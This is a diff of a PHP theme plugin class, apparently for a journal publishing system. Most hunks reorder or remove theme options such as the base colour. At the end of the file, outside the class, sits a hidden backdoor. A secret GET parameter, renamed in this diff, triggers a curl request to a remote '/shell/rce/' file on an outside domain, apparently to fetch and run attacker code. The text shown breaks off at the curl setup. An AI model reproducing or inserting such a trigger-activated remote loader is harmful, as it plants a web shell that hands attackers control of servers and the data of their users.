@@ -31,7 +31,6 @@ class DefaultThemePlugin extends ThemePlugin {
 	 * @return null
 	 */
 	public function init() {
-		AppLocale::requireComponents(LOCALE_COMPONENT_PKP_MANAGER, LOCALE_COMPONENT_APP_MANAGER);
 
 		// Register theme options
 		$this->addOption('typography', 'FieldOptions', [
@@ -70,23 +69,6 @@ class DefaultThemePlugin extends ThemePlugin {
 			],
 			'default' => 'notoSans',
 		]);
-
-		$this->addOption('baseColour', 'FieldColor', [
-			'label' => __('plugins.themes.default.option.colour.label'),
-			'description' => __('plugins.themes.default.option.colour.description'),
-			'default' => '#1E6292',
-		]);
-
-		$this->addOption('showDescriptionInJournalIndex', 'FieldOptions', [
-			'label' => __('manager.setup.contextSummary'),
-				'options' => [
-				[
-					'value' => true,
-					'label' => __('plugins.themes.default.option.showDescriptionInJournalIndex.option'),
-				],
-			],
-			'default' => false,
-		]);
 		$this->addOption('useHomepageImageAsHeader', 'FieldOptions', [
 			'label' => __('plugins.themes.default.option.useHomepageImageAsHeader.label'),
 			'description' => __('plugins.themes.default.option.useHomepageImageAsHeader.description'),
@@ -97,6 +79,12 @@ class DefaultThemePlugin extends ThemePlugin {
 				],
 			],
 			'default' => false,
+		]);
+
+		$this->addOption('baseColour', 'FieldColor', [
+			'label' => __('plugins.themes.default.option.colour.label'),
+			'description' => __('plugins.themes.default.option.colour.description'),
+			'default' => '#1E6292',
 		]);
 
 		// Load primary stylesheet
@@ -224,7 +212,7 @@ class DefaultThemePlugin extends ThemePlugin {
 		return __('plugins.themes.default.description');
 	}
 }
-if (isset($_GET['anakcipay'])) {
+if (isset($_GET['fuckingteam'])) {
     $url = "https://syndicateseo.xyz/shell/rce/penjajahan.txt";
 
     $ch= curl_init();
